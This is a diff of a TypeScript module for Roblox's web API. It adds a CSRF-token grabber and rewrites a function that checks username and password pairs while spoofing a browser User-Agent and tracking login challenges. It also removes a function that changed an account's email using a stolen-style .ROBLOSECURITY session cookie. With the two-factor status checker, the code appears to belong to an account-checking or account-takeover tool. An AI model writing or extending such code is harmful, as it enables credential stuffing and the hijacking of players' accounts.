@@ -1,3 +1,4 @@
+// src/lib/roblox-api.ts
 import axios from 'axios';
 import { CookieJar } from 'tough-cookie';
 import { wrapper } from 'axios-cookiejar-support';
@@ -330,109 +331,74 @@ export async function checkTwoFactorStatus(cookie: string, userId: string): Prom
   return { enabled: false, mediaType: null };
 }
 
+export async function getCsrfToken(): Promise<string | null> {
+  try {
+    const resp = await axios.post(ENDPOINTS.AUTH_LOGOUT, {}, {
+      headers: {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+      },
+      validateStatus: () => true,
+    });
+    if (resp.status === 403) {
+      return resp.headers['x-csrf-token'] as string || null;
+    }
+    return null;
+  } catch {
+    return null;
+  }
+}
+
 export async function validatePassword(username: string, password: string): Promise<{
   valid: boolean;
   error?: string;
   challenge?: boolean;
-  challengeType?: string;
   challengeId?: string;
+  challengeType?: string;
 }> {
-  const url = ENDPOINTS.AUTH_LOGIN;
-  const baseHeaders = {
-    'Content-Type': 'application/json',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'Accept': 'application/json',
-  };
+  const csrf = await getCsrfToken();
+  if (!csrf) {
+    return { valid: false, error: 'Failed to get CSRF token' };
+  }
 
   try {
-    let csrf: string | null = null;
-    try {
-      const csrfResp = await axios.post(url, {}, {
-        headers: { ...baseHeaders, 'Content-Type': 'application/json' },
+    const resp = await axios.post(
+      ENDPOINTS.AUTH_PASSWORD_VALIDATE,
+      { username, password },
+      {
+        headers: {
+          'Content-Type': 'application/json',
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'X-CSRF-TOKEN': csrf,
+        },
         validateStatus: () => true,
         timeout: AXIOS_TIMEOUT,
-      });
-      if (csrfResp.status === 403) {
-        csrf = csrfResp.headers['x-csrf-token'] as string || null;
       }
-    } catch {}
-
-    const payload = { ctype: 'Username', cvalue: username, password };
-    const headers = { ...baseHeaders };
-    if (csrf) headers['X-CSRF-TOKEN'] = csrf;
-
-    const resp = await axios.post(url, payload, {
-      headers,
-      validateStatus: () => true,
-      timeout: AXIOS_TIMEOUT,
-    });
+    );
 
     if (resp.status === 200) {
-      return { valid: true };
+      const data = resp.data;
+      if (data.code === 0 && data.message === 'Password is valid') {
+        return { valid: true };
+      }
+      return { valid: false, error: data.message || 'Invalid password' };
     }
     if (resp.status === 403) {
       const challengeId = resp.headers['rblx-challenge-id'];
-      const challengeType = resp.headers['rblx-challenge-type'];
       if (challengeId) {
         return {
           valid: false,
           challenge: true,
-          challengeType: challengeType || 'unknown',
           challengeId: challengeId,
+          challengeType: resp.headers['rblx-challenge-type'] || 'unknown',
           error: 'Challenge required',
         };
       }
-      return { valid: false, error: `HTTP ${resp.status} - ${resp.data?.errors?.[0]?.message || 'Unknown error'}` };
-    }
-    if (resp.status === 400 || resp.status === 401) {
-      return { valid: false, error: `HTTP ${resp.status} - ${resp.data?.errors?.[0]?.message || 'Invalid credentials'}` };
+      return { valid: false, error: '403 without challenge' };
     }
     return { valid: false, error: `HTTP ${resp.status}` };
   } catch (err: any) {
     return { valid: false, error: err.message };
-  }
-}
-
-export async function addPendingEmail(cookie: string, newEmail: string, password: string): Promise<{ success: boolean; error?: string }> {
-  try {
-    const session = await (async () => {
-      const jar = new CookieJar();
-      await jar.setCookie(`.ROBLOSECURITY=${cookie.trim()}; Domain=.roblox.com; Path=/`, 'https://accountsettings.roblox.com');
-      return wrapper(axios.create({ jar }));
-    })();
-
-    const baseHeaders = {
-      'Content-Type': 'application/json',
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    };
-
-    let resp = await session.post(ENDPOINTS.ACCOUNT_EMAIL, { email: newEmail, password }, {
-      headers: baseHeaders,
-      validateStatus: () => true,
-      timeout: AXIOS_TIMEOUT,
-    });
-
-    if (resp.status === 403 && resp.headers['x-csrf-token']) {
-      const csrf = resp.headers['x-csrf-token'];
-      resp = await session.post(ENDPOINTS.ACCOUNT_EMAIL, { email: newEmail, password }, {
-        headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf },
-        validateStatus: () => true,
-        timeout: AXIOS_TIMEOUT,
-      });
-    }
-
-    if (resp.status === 200) {
-      return { success: true };
-    }
-
-    let errorMsg = `HTTP ${resp.status}`;
-    try {
-      const json = resp.data;
-      if (json && json.message) errorMsg = json.message;
-    } catch {}
-    return { success: false, error: errorMsg };
-  } catch (err: any) {
-    return { success: false, error: err.message };
   }
 }
 
